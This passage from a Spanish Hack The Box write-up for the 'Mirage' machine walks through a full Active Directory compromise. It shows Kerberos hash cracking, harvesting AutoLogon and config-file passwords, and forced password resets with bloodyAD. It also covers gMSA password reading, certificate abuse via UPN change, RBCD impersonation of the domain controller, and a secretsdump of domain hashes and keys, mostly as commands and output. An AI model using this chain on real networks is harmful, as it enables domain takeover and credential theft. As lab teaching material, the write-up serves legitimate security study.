john --format=krb5tgs --wordlist=<WORDLIST> hash.nathan.aadam
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
3edc#EDC3        (?)     
1g 0:00:00:03 DONE (2025-10-27 12:50) 0.3134g/s 3909Kp/s 3909Kc/s 3909KC/s 3er733..3butch
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Veremos que ha funcionado, por lo que obtendremos dichas credenciales de dicho usuario, vamos a obtener el `TGT` del usuario para utilizar la autenticacion por `kerberos`.

### Obtener TGT nathan.aadam

```shell
ntpdate mirage.htb ; impacket-getTGT mirage.htb/'nathan.aadam':'3edc#EDC3'
```

Info:

```
2025-10-27 12:52:42.314540 (-0700) +37.433622 +/- 0.013895 mirage.htb 10.10.11.78 s1 no-leap
CLOCK: time stepped by 37.433622
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in nathan.aadam.ccache
```

Ahora vamos a exportarlo por la variable de `kerberos` de esta forma como antes:

```shell
export KRB5CCNAME=/home/kali/Desktop/mirage/nathan.aadam.ccache
```

Hecho esto vamos a probar a conectarnos por `WinRM` utilizando la autenticacion de `Kerberos`, pero para que no de errores de zona horaria, vamos ha configurar `kerberos5` con el `KDC`.

```shell
sudo tee /etc/krb5.conf > /dev/null << 'EOF'
[libdefaults]
    default_realm = MIRAGE.HTB
    dns_lookup_kdc = true
    dns_lookup_realm = false

[realms]
    MIRAGE.HTB = {
        kdc = dc01.mirage.htb
        admin_server = dc01.mirage.htb
        default_domain = mirage.htb
    }

[domain_realm]
    .mirage.htb = MIRAGE.HTB
    mirage.htb = MIRAGE.HTB
EOF
```

Ahora vamos a conectarnos con la herramienta de `evil-winrm` habiendo configurado ya todo y utilizando la autenticacion de `kerberos`.

### evil-winrm user nathan.aadam

```shell
evil-winrm -i dc01.mirage.htb -r mirage.htb
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> whoami
mirage\nathan.aadam
```

Veremos que habremos accedido de forma correcta al servidor de la maquina victima por `WinRM`, por lo que leeremos la `flag` del usuario.

> user.txt

```
dafea25ecef938b5623a9a53297f7735
```

## Escalate user MARK.BBOND

Vamos a dumpearnos en un `ZIP` la informacion del `dominio` para darsela a `BloodHound` y poder ver un poco los privilegios y escalada principal de forma mas clara.

Desde una terminal de nuestro atacante vamos a lanzar el siguiente comando:

```shell
ntpdate mirage.htb ; bloodhound-python -u nathan.aadam -p '3edc#EDC3' -ns <IP> -c All -d mirage.htb --zip
```

Info:

```
NFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: mirage.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.mirage.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.mirage.htb
INFO: Found 12 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 21 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.mirage.htb
INFO: Done in 00M 10S
INFO: Compressing output into 20251027224201_bloodhound.zip
```

## BloodHound

Ahora vamos a instalar `BloodHound` de forma rapida en un `docker`:

URL = [Download BloodHound en Docker](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart)

```shell
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
./bloodhound-cli install
```

Info:

```
..............................<RESTO DE INFO>......................................
Container bloodhound-graph-db-1  Creating
 Container bloodhound-app-db-1  Creating
 Container bloodhound-graph-db-1  Created
 Container bloodhound-app-db-1  Created
 Container bloodhound-bloodhound-1  Creating
 Container bloodhound-bloodhound-1  Created
 Container bloodhound-app-db-1  Starting
 Container bloodhound-graph-db-1  Starting
 Container bloodhound-app-db-1  Started
 Container bloodhound-graph-db-1  Started
 Container bloodhound-graph-db-1  Waiting
 Container bloodhound-app-db-1  Waiting
 Container bloodhound-graph-db-1  Healthy
 Container bloodhound-app-db-1  Healthy
 Container bloodhound-bloodhound-1  Starting
 Container bloodhound-bloodhound-1  Started
[+] BloodHound is ready to go!
[+] You can log in as `admin` with this password: bnf8XsztC4Hypx6nMV5eSlhHpuDfEWgH
[+] You can get your admin password by running: bloodhound-cli config get default_password
[+] You can access the BloodHound UI at: http://127.0.0.1:8080/ui/login
```

Ahora que esta importado en nuestro `docker` y levantado podremos acceder a el desde la siguiente `URL`.

```
URL = http://127.0.0.1:8080/ui/login
```

Nos logueamos con las credenciales propocionadas por la herramienta, entrando nos pedira cambiar las credenciales y ya nos metera dentro:

```
User: admin
Pass: bnf8XsztC4Hypx6nMV5eSlhHpuDfEWgH
```

Una vez dentro vamos a importar el `.zip` y tendremos que esperar un poco a que cargue todos los datos, despues cuando vayamos al `dashboard` principal veremos todos los datos, vamos a investigar el usuario `nathan.aadam` a ver que tiene.

### WinPEAS

Veremos que con ese usuario no vemos nada interesante, por lo que vamos a realizar un `fuzzing` con `WinPEAS` a que nos scanee todo el sistema a ver que encuentra.

```shell
wget 'https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe'
mv winPEASany_ofs.exe winPEAS.exe
chmod +x winPEAS.exe
```

Ahora desde la utilidad de `evil-winrm` podremos subirlo con un comando:

```powershell
cd ..\Downloads
upload winPEAS.exe
```

Info:

```
Info: Uploading /home/kali/Desktop/mirage/winPEAS.exe to C:\Users\nathan.aadam\Downloads\winPEAS.exe
                                        
Data: 13368660 bytes of 13368660 bytes copied
                                        
Info: Upload successful!
```

Ahora vamos a ejecutarlo de esta forma:

```powershell
.\winPEAS.exe
```

Info:

```
.................................<RESTO_DE_INFO>...................................
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  MIRAGE
    DefaultUserName               :  mark.bbond
    DefaultPassword               :  1day@atime
.................................<RESTO_DE_INFO>...................................
```

Tambien veremos interesante este archivo de aqui:

```
C:\Program Files\Nats-Server\nats-server.conf
```

Si lo leemos veremos lo siguiente:

```powershell
type 'C:\Program Files\Nats-Server\nats-server.conf'
```

Info:

```
listen: '0.0.0.0:4222'

jetstream: {
  store_dir: 'C:\Program Files\Nats-Server\tmp'
}

accounts: {
  '$SYS': {
    users: [
      { user: 'sysadmin', password: 'bb5M0k5XWIGD' }
    ]
  },

  'dev': {
    jetstream: true,
    users: [
      { user: 'Dev_Account_A', password: 'hx5h7F5554fP@1337!' },
      { user: 'Dev_Account_B', password: 'tvPFGAzdsJfHzbRJ' }
    ]
  }
}
```

Vemos lo que parecen credenciales, las cuales nos vamos a guardar para probarlas si nos hiciera falta en un futuro, pero es interesante saberlo.

Despues de investigar un rato en `BloodHound` veremos con el usuario `mark.bbond` que es muy interesante ya que puede forzar el cambio de contraseña respecto al usuario llamado `JAVIER.MMARSHALL`.

<figure><img src="../../.gitbook/assets/Pasted image 20251027165329.png" alt=""><figcaption></figcaption></figure>

Este usuarios a su vez tendra los privilegios de `ReadGMSAPassword` respecto al servicio llamado `MIRAGE-SERVICE$`...

<figure><img src="../../.gitbook/assets/Pasted image 20251027165711.png" alt=""><figcaption></figcaption></figure>

Esto es muy interesante ya que podremos obtener las credenciales de dicho servicio, vamos a empezar por escalar al usuario llamado `MARK.BBOND` de esta forma:

Primero vamos a probar las credenciales intentando obtener la informacion a nivel de `objeto` del usuario `JAVIER.MMARSHALL`.

```shell
git clone https://github.com/CravateRouge/bloodyAD.git
cd bloodyAD/
python3 -m venv .venv ; source .venv/bin/activate
python3 bloodyAD.py -k -d mirage.htb -u mark.bbond -p '1day@atime' --host dc01.mirage.htb get object 'JAVIER.MMARSHALL'
```

Info:

```
Clock skew detected. Adjusting local time by 0:05:11.694067. Retrying operation.

distinguishedName: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
accountExpires: 9999-12-31 23:59:59.999999+00:00
badPasswordTime: 1601-01-01 00:00:00+00:00
badPwdCount: 0
cn: javier.mmarshall
codePage: 0
countryCode: 0
dSCorePropagationData: 2025-05-22 21:49:20+00:00
description: Contoso Contractors
displayName: javier.mmarshall
givenName: javier.mmarshall
instanceType: 4
lastLogoff: 1601-01-01 00:00:00+00:00
lastLogon: 2025-05-25 18:43:57.120180+00:00
lastLogonTimestamp: 2025-05-22 21:45:29.508220+00:00
logonCount: 13
logonHours: 
memberOf: CN=IT_Contractors,OU=Groups,OU=Contractors,OU=IT_Staff,DC=mirage,DC=htb
msDS-SupportedEncryptionTypes: 0
nTSecurityDescriptor: O:S-1-5-21-2127163471-3824721834-2568365109-512G:S-1-5-21-2127163471-3824721834-2568365109-512D:AI(OD;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;S-1-1-0)(OD;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;S-1-5-10)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;S-1-5-21-2127163471-3824721834-2568365109-2602)(OA;;CR;00299570-246d-11d0-a768-00aa006e0529;;S-1-5-21-2127163471-3824721834-2568365109-2602)(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-2127163471-3824721834-2568365109-553)(OA;;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;;S-1-5-21-2127163471-3824721834-2568365109-553)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;;S-1-5-21-2127163471-3824721834-2568365109-553)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;;S-1-5-21-2127163471-3824721834-2568365109-553)(OA;;WP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-2127163471-3824721834-2568365109-2602)(OA;;WP;bf9679ab-0de6-11d0-a285-00aa003049e2;;S-1-5-21-2127163471-3824721834-2568365109-2602)(OA;;0x30;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-2127163471-3824721834-2568365109-517)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;0x30;6db69a1c-9422-11d1-aebd-0000f80367c1;;S-1-5-32-561)(OA;;0x30;5805bc62-bdc9-4428-a5e2-856a0f4c185e;;S-1-5-32-561)(OA;;CR;ab721a54-1e2f-11d0-9819-00aa0040529b;;S-1-5-10)(OA;;CR;ab721a56-1e2f-11d0-9819-00aa0040529b;;S-1-5-10)(OA;;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;;S-1-5-11)(OA;;RP;e48d0154-bcf8-11d1-8702-00c04fb96050;;S-1-5-11)(OA;;RP;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-11)(OA;;RP;e45795b3-9455-11d1-aebd-0000f80367c1;;S-1-5-11)(OA;;0x30;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-10)(OA;;0x30;e45795b2-9455-11d1-aebd-0000f80367c1;;S-1-5-10)(OA;;0x30;e45795b3-9455-11d1-aebd-0000f80367c1;;S-1-5-10)(A;;0x20014;;;S-1-5-21-2127163471-3824721834-2568365109-2602)(A;;0xf01ff;;;S-1-5-21-2127163471-3824721834-2568365109-512)(A;;0xf01ff;;;S-1-5-32-548)(A;;RC;;;S-1-5-11)(A;;0x20094;;;S-1-5-10)(A;;0xf01ff;;;S-1-5-18)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;4c164200-20c0-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-2127163471-3824721834-2568365109-526)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-2127163471-3824721834-2568365109-527)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-3-0)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;0x20094;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;0x20094;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIID;0x20094;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;OICIID;0x30;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;S-1-5-10)(OA;CIID;0x130;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;S-1-5-10)(A;CIID;0xf01ff;;;S-1-5-21-2127163471-3824721834-2568365109-519)(A;CIID;LC;;;S-1-5-32-554)(A;CIID;0xf01bd;;;S-1-5-32-544)
name: javier.mmarshall
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=mirage,DC=htb
objectClass: top; person; organizationalPerson; user
objectGUID: c52e731b-30c1-439c-a6b9-0c2f804e5f08
objectSid: S-1-5-21-2127163471-3824721834-2568365109-1108
primaryGroupID: 513
pwdLastSet: 2025-05-25 18:44:43.217870+00:00
sAMAccountName: javier.mmarshall
sAMAccountType: 805306368
uSNChanged: 69841
uSNCreated: 24655
userAccountControl: ACCOUNTDISABLE; NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
userPrincipalName: javier.mmarshall@mirage.htb
whenChanged: 2025-05-25 18:44:43+00:00
whenCreated: 2025-05-02 08:33:11+00:00
```

Vemos que funciona, por lo que vamos a probar a resetear la contraseña del usuario `javier.mmarshall` de esta forma, pero antes vamos a obtener el `TGT` de dicho usuario para utilizar la autenticacion de `kerberos`:

## Escalate user JAVIER.MMARSHALL

```shell
ntpdate mirage.htb ; impacket-getTGT mirage.htb/'mark.bbond':'1day@atime'
```

Info:

```
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in mark.bbond.ccache
```

Veremos que ha funcionado, por lo que vamos a exportar la variable de `kerberos`:

```shell
export KRB5CCNAME=mark.bbond.ccache
```

Ahora vamos si vamos a resetear la contraseña de dicho usuario:

```shell
ntpdate mirage.htb ; python3 bloodyAD.py -k --host dc01.mirage.htb -d mirage.htb -u mark.bbond -p '1day@atime' set password javier.mmarshall 'NuevaPassword123!'
```

Info:

```
[+] Password changed successfully!
```

Veremos que funciono, por lo que vamos a obtener el `TGT` de dicho usuario para utilizar la autenticacion de `kerberos`, pero si lo intentamos veremos que algo lo esta rechazando, vamos a probar a deshabilitar el `UAC` de dicho usuario.

```shell
ntpdate mirage.htb ; python3 bloodyAD.py -k -d mirage.htb -u mark.bbond -p '1day@atime' --host dc01.mirage.htb remove uac "javier.mmarshall" -f ACCOUNTDISABLE
```

Info:

```
[+] ['ACCOUNTDISABLE'] property flags removed from javier.mmarshall's userAccountControl
```

Hecho esto vamos a probar a obtener dicho `TGT` del usuario...

```shell
ntpdate mirage.htb ; impacket-getTGT mirage.htb/'javier.mmarshall':'NuevaPassword123!'
```

Info:

```
2025-10-28 08:28:35.501143 (-0700) +3.685851 +/- 0.014407 mirage.htb 10.10.11.78 s1 no-leap
CLOCK: time stepped by 3.685851
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
```

Veremos que nos da un error de que la cuenta puede estar `dehabilitada` o `revocada` por lo que vamos a probar desde la `shell` de `powershell` a ejecutar el siguiente comando:

### Quitar restriccion (JAVIER.MMARSHALL)

```powershell
$Password = ConvertTo-SecureString "1day@atime" -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential("MIRAGE\mark.bbond", $Password)
Enable-ADAccount -Identity "javier.mmarshall" -Credential $Cred
Set-ADUser -Identity "javier.mmarshall" -Credential $Cred -Clear "logonHours"
```

Con esto lo que hacemos es crear una contraseña de forma segura, habilitar la cuenta y seguidamente limpiarle las restricciones de horario que pueda tener el usuario para que asi no de error, ahora desde la terminal de nuestro `host` vamos a repetir el mismo proceso de cambiar la contraseña de nuevo por si acaso.

```shell
ntpdate mirage.htb ; python3 bloodyAD.py -k --host dc01.mirage.htb -d mirage.htb -u mark.bbond -p '1day@atime' set password javier.mmarshall 'NuevaPassword123!'
```

Y ahora seguidamente obtenemos el `TGT` del usuario `javier.mmarshall`.

## Escalate service Mirage-Service$

```shell
ntpdate mirage.htb ; impacket-getTGT mirage.htb/javier.mmarshall:'NuevaPassword123!' -dc-ip <IP>
```

Info:

```
2025-10-28 09:24:46.253352 (-0700) +1.356426 +/- 0.013565 mirage.htb 10.10.11.78 s1 no-leap
CLOCK: time stepped by 1.356426
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in javier.mmarshall.ccache
```

Veremos que ha funcionado, por lo que vamos a exportarlo en la variable de `kerberos` para utilizar la autenticacion de `kerberos`.

```shell
export KRB5CCNAME=javier.mmarshall.ccache
```

Ahora recordemos que podemos obtener el `hash NTLM` del servicio `Mirage-Service$` por lo que lo obtendremos de esta forma:

```shell
ntpdate mirage.htb ; python3 bloodyAD.py -k --host dc01.mirage.htb -d mirage.htb -u javier.mmarshall -p 'NuevaPassword123!' get object 'Mirage-Service$' --attr msDS-ManagedPassword
```

Info:

```
2025-10-28 09:31:26.586076 (-0700) +40.032776 +/- 0.015523 mirage.htb 10.10.11.78 s1 no-leap
CLOCK: time stepped by 40.032776

distinguishedName: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:16baff9fa47c1dd1ccfe95f95d60145f
msDS-ManagedPassword.B64ENCODED: C3MZiqHEeL5bZbw9VoU8aioG6hZVLBzYmjLkpg1rhk0UGBuEjOFMJEpBwFOnEh0LBCEOYxo3EiTyToYPMOmBRmBezBeDmmqND9AIsA9H+KNtNuZM5vRrkjfQxmA0MiVfeY3PYHnw6wxCiJNuOZGhYV9WvlddkcfnDc4ALXpPUPjSupQpYlTeUJrkSl7vUjmHnI+5+itzFu7e90FNR7vky5Vb1IRQ6hC9Ac9Y5ZeVTGBMNqc+u66hr8F6tnAbByPNgc9cHRDaJZdDcjcOlu6rM+gkCCQpuo5RuqxMGrkV4hiD+TH+ak7/+nKibQkZSGsn44VWxzrdJMMhDUZ/+vsvJQ==
```

Vemos que lo hemos obtenido de forma correcta, por lo que vamos a obtener el `TGT` del servicio utilizando el propio `hash` de esta forma:

```shell
ntpdate mirage.htb ; impacket-getTGT mirage.htb/Mirage-Service\$ -hashes :16baff9fa47c1dd1ccfe95f95d60145f
```

Info:

```
2025-10-28 09:34:22.658534 (-0700) +17.610392 +/- 0.013982 mirage.htb 10.10.11.78 s1 no-leap
CLOCK: time stepped by 17.610392
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Mirage-Service$.ccache
```

Veremos que ha funcionado, teniendo esto vamos a exportarlo a nuestra variable de `kerberos`.

## Escalate Privileges

```shell
export KRB5CCNAME=Mirage-Service\$.ccache
```

Investigando un poco veremos que podremos realizar un abuso de certificado, para ello vamos a engañar al sistema haciendole creer que la cuenta de `dc01$` se llama `mirage-service$` para ello cambiaremos el `UPN` de la cuenta `dc01$`, para asignarle un nuevo `UPN` hacia el servicio `mirage-service$`.

### Modificacion del UPN

```shell
ntpdate mirage.htb ; certipy-ad account update -user 'mark.bbond' -upn 'dc01$@mirage.htb' -u 'mirage-service$@mirage.htb' -k -no-pass -dc-ip <IP> -target dc01.mirage.htb
```

Info:

```
2025-10-28 09:43:19.020477 (-0700) +1.256633 +/- 0.013552 mirage.htb 10.10.11.78 s1 no-leap
CLOCK: time stepped by 1.256633
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'mark.bbond':
    userPrincipalName                   : dc01$@mirage.htb
[*] Successfully updated 'mark.bbond'
```

Ahora que cambiamos el `UPN` podremos solicitar un certificado utilizando el `TGT` del usuario `mark`, ahora podremos solicitarlo ya que cambiamos el `UPN` al de dicho servicio.

### Solicitud de certificado

```shell
export KRB5CCNAME=mark.bbond.ccache # Exportamos el archivo de kerberos de mark
ntpdate mirage.htb ; certipy-ad req -u 'mark.bbond@mirage.htb' -k -no-pass -dc-ip <IP> -target 'dc01.mirage.htb' -ca 'mirage-DC01-CA' -template 'User'
```

Info:

```
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 10
[*] Successfully requested certificate
[*] Got certificate with UPN 'dc01$@mirage.htb'
[*] Certificate object SID is 'S-1-5-21-2127163471-3824721834-2568365109-1109'
[*] Saving certificate and private key to 'dc01.pfx'
[*] Wrote certificate and private key to 'dc01.pfx'
```

Veremos que ha funcionado y obtendremos un archivo llamado `dc01.pfx`, con este podremos abrir una `shell` con privilegios de `DC` directamente utilizando el certificado.

### Suplatacion de dc01$

```shell
export KRB5CCNAME=Mirage-Service\$.ccache
ntpdate mirage.htb ; certipy-ad auth -pfx dc01.pfx -dc-ip <IP> -ldap-shell
```

Info:

```
2025-10-28 09:50:16.522067 (-0700) +41.752162 +/- 0.014685 mirage.htb 10.10.11.78 s1 no-leap
CLOCK: time stepped by 41.752162
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'dc01$@mirage.htb'
[*]     Security Extension SID: 'S-1-5-21-2127163471-3824721834-2568365109-1109'
[*] Connecting to 'ldaps://10.10.11.78:636'
[*] Authenticated to '10.10.11.78' as: 'u:MIRAGE\\mark.bbond'
Type help for list of commands

#
```

Ahora dentro de dicha `shell` vamos a configurar el `RBCD` para que la cuenta `nathan.aadam` pueda **suplantar** a `dc01$`.

```
set_rbcd DC01$ nathan.aadam
```

Info:

```
Found Target DN: CN=DC01,OU=Domain Controllers,DC=mirage,DC=htb
Target SID: S-1-5-21-2127163471-3824721834-2568365109-1000

Found Grantee DN: CN=nathan.aadam,OU=Users,OU=Admins,OU=IT_Staff,DC=mirage,DC=htb
Grantee SID: S-1-5-21-2127163471-3824721834-2568365109-1110
Delegation rights modified successfully!
nathan.aadam can now impersonate users on DC01$ via S4U2Proxy
```

Veremos que ha funcionado por lo que vamos a volver a solicitar el `TGT` de dicho usuario:

```shell
ntpdate mirage.htb ; impacket-getTGT mirage.htb/'nathan.aadam':'3edc#EDC3' -dc-ip <IP>
```

Info:

```
2025-10-28 10:02:04.700059 (-0700) +70.820815 +/- 0.014602 mirage.htb 10.10.11.78 s1 no-leap
CLOCK: time stepped by 70.820815
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in nathan.aadam.ccache
```

Ahora vamos a exportar la variable `kerberos` de esta forma:

```shell
export KRB5CCNAME=nathan.aadam.ccache
```

Hecho esto vamos a obtener el `TGT` del usuario `dc01$` suplantandole con el `TGT` del usuario `nathan.aadam` como ya configuramos anteriormente:

```shell
impacket-getST -spn 'CIFS/dc01.mirage.htb' -impersonate 'DC01$' 'MIRAGE.HTB/nathan.aadam:3edc#EDC3' -k
```

Info:

```
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating DC01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC01$@CIFS_dc01.mirage.htb@MIRAGE.HTB.ccache
```

Ahora vamos a exportarlo en nuestra variable de `kerberos` de esta forma:

```shell
export KRB5CCNAME=DC01\$@CIFS_dc01.mirage.htb@MIRAGE.HTB.ccache
```

Vamos a dumpearnos los `secretos` de `windows` gracias a este usuario de esta forma:

### Dump secrets windows

```shell
impacket-secretsdump -k -no-pass dc01.mirage.htb
```

Info:

```
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
mirage.htb\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7be6d4f3c2b9c0e3560f5a29eeb1afb3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1adcc3d4a7f007ca8ab8a3a671a66127:::
mirage.htb\Dev_Account_A:1104:aad3b435b51404eeaad3b435b51404ee:3db621dd880ebe4d22351480176dba13:::
mirage.htb\Dev_Account_B:1105:aad3b435b51404eeaad3b435b51404ee:fd1a971892bfd046fc5dd9fb8a5db0b3:::
mirage.htb\david.jjackson:1107:aad3b435b51404eeaad3b435b51404ee:ce781520ff23cdfe2a6f7d274c6447f8:::
mirage.htb\javier.mmarshall:1108:aad3b435b51404eeaad3b435b51404ee:694fba7016ea1abd4f36d188b3983d84:::
mirage.htb\mark.bbond:1109:aad3b435b51404eeaad3b435b51404ee:8fe1f7f9e9148b3bdeb368f9ff7645eb:::
mirage.htb\nathan.aadam:1110:aad3b435b51404eeaad3b435b51404ee:1cdd3c6d19586fd3a8120b89571a04eb:::
mirage.htb\svc_mirage:2604:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:b5b26ce83b5ad77439042fbf9246c86c:::
Mirage-Service$:1112:aad3b435b51404eeaad3b435b51404ee:16baff9fa47c1dd1ccfe95f95d60145f:::
[*] Kerberos keys grabbed
mirage.htb\Administrator:aes256-cts-hmac-sha1-96:09454bbc6da252ac958d0eaa211293070bce0a567c0e08da5406ad0bce4bdca7
mirage.htb\Administrator:aes128-cts-hmac-sha1-96:47aa953930634377bad3a00da2e36c07
mirage.htb\Administrator:des-cbc-md5:e02a73baa10b8619
krbtgt:aes256-cts-hmac-sha1-96:95f7af8ea1bae174de9666c99a9b9edeac0ca15e70c7246cab3f83047c059603
krbtgt:aes128-cts-hmac-sha1-96:6f790222a7ee5ba9d2776f6ee71d1bfb
krbtgt:des-cbc-md5:8cd65e54d343ba25
mirage.htb\Dev_Account_A:aes256-cts-hmac-sha1-96:e4a6658ff9ee0d2a097864d6e89218287691bf905680e0078a8e41498f33fd9a
mirage.htb\Dev_Account_A:aes128-cts-hmac-sha1-96:ceee67c4feca95b946e78d89cb8b4c15
mirage.htb\Dev_Account_A:des-cbc-md5:26dce5389b921a52
mirage.htb\Dev_Account_B:aes256-cts-hmac-sha1-96:5c320d4bef414f6a202523adfe2ef75526ff4fc6f943aaa0833a50d102f7a95d
mirage.htb\Dev_Account_B:aes128-cts-hmac-sha1-96:e05bdceb6b470755cd01fab2f526b6c0
mirage.htb\Dev_Account_B:des-cbc-md5:e5d07f57e926ecda
mirage.htb\david.jjackson:aes256-cts-hmac-sha1-96:3480514043b05841ecf08dfbf33d81d361e51a6d03ff0c3f6d51bfec7f09dbdb
mirage.htb\david.jjackson:aes128-cts-hmac-sha1-96:bd841caf9cd85366d254cd855e61cd5e
mirage.htb\david.jjackson:des-cbc-md5:76ef68d529459bbc
mirage.htb\javier.mmarshall:aes256-cts-hmac-sha1-96:20acfd56be43c1123b3428afa66bb504a9b32d87c3269277e6c917bf0e425502
mirage.htb\javier.mmarshall:aes128-cts-hmac-sha1-96:9d2fc7611e15be6fe16538ebb3b2ad6a
mirage.htb\javier.mmarshall:des-cbc-md5:6b3d51897fdc3237
